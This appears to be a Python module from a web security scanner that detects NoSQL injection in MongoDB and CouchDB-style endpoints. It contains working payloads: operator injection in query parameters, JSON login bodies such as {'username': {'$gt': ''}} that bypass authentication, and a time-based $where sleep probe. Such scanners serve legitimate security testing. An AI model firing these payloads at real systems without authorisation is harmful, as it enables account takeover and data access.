"""NoSQL injection scanner (MongoDB / CouchDB / generic operator injection).

Covers the classes that classic SQLi scanners miss entirely:

  * **Operator injection** — `param[$ne]=`, `param[$gt]=`, `param[$regex]=.*`
    in query/form, and `{"param": {"$ne": null}}` in JSON bodies.
  * **Authentication bypass** — `{"user": {"$gt": ""}, "pass": {"$gt": ""}}`
    against login endpoints (the canonical Mongo auth bypass).
  * **Boolean-based blind** — a true-shaped operator returns the populated
    response, a false-shaped one returns the empty/denied response; confirmed
    by a double check against a per-endpoint baseline.
  * **Error-based** — driver/parse error signatures in the body.
  * **Time-based blind** via `$where` JS `sleep()` — heavy, so gated behind
    `--aggressive`.

All routed through core.injection where possible so JSON-body endpoints
(discovered by the surface module) get tested too.
"""
from __future__ import annotations

import asyncio
import re
import time
from typing import TYPE_CHECKING

from core.injection import parse_point
from core.utils import merge_query, random_token

if TYPE_CHECKING:
    from core.orchestrator import Context

ERROR_RE = re.compile(
    r"(MongoError|mongodb|BSONObj|E11000|\$where|CastError|"
    r"couchdb|unexpected token|SyntaxError: |cannot apply \$|"
    r"MongoServerError|unknown operator)", re.I)

AUTH_HINT = re.compile(r"/(login|signin|sign-in|auth|authenticate|session|token)\b", re.I)
SUCCESS_HINT = re.compile(r'(token|"success"\s*:\s*true|set-cookie|dashboard|welcome|"role"|"id"\s*:)', re.I)


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    sem = asyncio.Semaphore(int(ctx.config.get("concurrency", {}).get("scanner_workers", 8)))
    aggressive = bool(ctx.config.get("safety", {}).get("aggressive"))

    base = await ctx.http.get(url)
    base_len = len(base.response_body or "")
    base_status = base.status

    # plain query/form param names only (operator injection needs the raw key)
    plain = [p for p in params if parse_point(p)[0] == "query"]

    # ---------- authentication bypass (JSON login) ----------
    if AUTH_HINT.search(url):
        findings.extend(await _auth_bypass(ctx, url, base))

    async def test_param(param: str) -> None:
        rand = random_token(8)
        # error-based + operator probes
        probes = [
            (f"{param}[$ne]", rand, "$ne"),
            (f"{param}[$gt]", "", "$gt"),
            (f"{param}[$regex]", ".*", "$regex"),
        ]
        for key, val, op in probes:
            async with sem:
                ev = await ctx.http.get(merge_query(url, {key: val}))
            body = ev.response_body or ""
            if ERROR_RE.search(body) and not ERROR_RE.search(base.response_body or ""):
                findings.append(_finding(url, param, key + "=" + val, "error", ev,
                    f"NoSQL driver/parse error surfaced by operator `{op}` — "
                    "input reaches a NoSQL query unsanitized."))
                return

        # boolean-based blind: true-operator vs false-operator
        async with sem:
            ev_true = await ctx.http.get(merge_query(url, {f"{param}[$ne]": rand}))
            ev_false = await ctx.http.get(merge_query(url, {f"{param}[$eq]": rand}))
        if ev_true.status and ev_true.status == ev_false.status:
            lt, lf = len(ev_true.response_body or ""), len(ev_false.response_body or "")
            delta = abs(lt - lf)
            noise = max(200, int(0.25 * max(base_len, 1)))
            # true ($ne: matches everything) should look like the populated
            # baseline; false ($eq: matches nothing) should differ. Require the
            # true branch to be at least as large as the false branch AND close
            # to the baseline, so a plain "changed page" can't false-fire.
            true_matches_baseline = base_len == 0 or abs(lt - base_len) <= noise
            if delta > noise and lt > lf and true_matches_baseline:
                async with sem:
                    ev_t2 = await ctx.http.get(merge_query(url, {f"{param}[$ne]": rand}))
                    ev_f2 = await ctx.http.get(merge_query(url, {f"{param}[$eq]": rand}))
                if abs(len(ev_t2.response_body or "") - len(ev_f2.response_body or "")) > 200:
                    findings.append(_finding(url, param, f"{param}[$ne] vs [$eq]", "boolean", ev_true,
                        f"Operator injection flips the result set: $ne→{lt}B, $eq→{lf}B "
                        f"(baseline {base_len}B), reproduced twice — blind NoSQL injection."))
                    return

        # time-based blind via $where (heavy → aggressive only)
        if aggressive:
            payload = {f"{param}[$where]": "sleep(5000)"}
            t0 = time.perf_counter()
            async with sem:
                ev = await ctx.http.get(merge_query(url, payload))
            if time.perf_counter() - t0 >= 4.5 and ev.status:
                t0 = time.perf_counter()
                async with sem:
                    await ctx.http.get(merge_query(url, payload))
                if time.perf_counter() - t0 >= 4.5:
                    findings.append(_finding(url, param, f"{param}[$where]=sleep(5000)", "time", ev,
                        "Two consecutive $where sleep(5000) injections delayed the response "
                        ">4.5s — confirms server-side JS evaluation (blind NoSQLi → RCE surface)."))

    await asyncio.gather(*(test_param(p) for p in plain[:8]))
    return findings


async def _auth_bypass(ctx, url, base) -> list[dict]:
    """Canonical Mongo auth bypass: replace credential strings with operators.

    First sends a control POST with clearly-wrong credentials; if the endpoint
    reports success for garbage input there is no meaningful bypass signal and
    we bail out. Only then do we try operator-injected bodies and require the
    same success evidence the control did NOT produce."""
    control_ev = await _post(ctx, url, {"username": "sx-nonexistent", "password": "sx-wrong"})
    if _post_success(control_ev):
        return []
    candidates = [
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"email": {"$ne": None}, "password": {"$ne": None}},
        {"user": {"$gt": ""}, "pass": {"$gt": ""}},
    ]
    for body in candidates:
        ev = await _post(ctx, url, body)
        if _post_success(ev):
            from core.poc import proof_record
            poc = proof_record(
                verified=True, method="POST", url=url,
                request=f"POST {url}\nContent-Type: application/json\n\n{body}",
                status=ev.status, excerpt=ev.response_body,
                rationale=("Operator-injected credentials authenticated successfully while the "
                           "control request with garbage credentials did NOT — the server treats "
                           "attacker-supplied query operators as credential matches "
                           "(MongoDB-style authentication bypass)."))
            return [_finding(url, "credentials", str(body), "auth_bypass", ev,
                "Operator-injected credentials authenticated without a valid password — "
                "MongoDB-style authentication bypass.", sev="critical", cvss=9.8,
                poc=poc)]
    return []


async def _post(ctx, url, body):
    return await ctx.http.request("POST", url, json_body=body,
                                  headers={"Content-Type": "application/json"})


def _post_success(ev) -> bool:
    if ev.status not in (200, 201, 204):
        return False
    return bool(SUCCESS_HINT.search(ev.response_body or "")) or \
        "set-cookie" in {k.lower() for k in ev.response_headers}


def _finding(url, param, payload, kind, ev, evidence, *, sev=None, cvss=None,
             poc=None) -> dict:
    sev_map = {"auth_bypass": ("critical", 9.8), "error": ("high", 7.5),
               "boolean": ("high", 7.5), "time": ("critical", 9.0)}
    s, c = (sev, cvss) if sev else sev_map.get(kind, ("high", 7.0))
    meta: dict = {"detection": kind}
    if poc is not None:
        meta["poc"] = poc
    return {
        "category": "nosqli",
        "title": f"NoSQL injection ({kind}) in `{param}`",
        "severity": s, "cvss": c,
        "url": url, "parameter": param, "payload": payload,
        "evidence": evidence,
        "request": f"{ev.method} {ev.url}",
        "response": (ev.response_body or "")[:1500],
        "metadata": meta,
    }
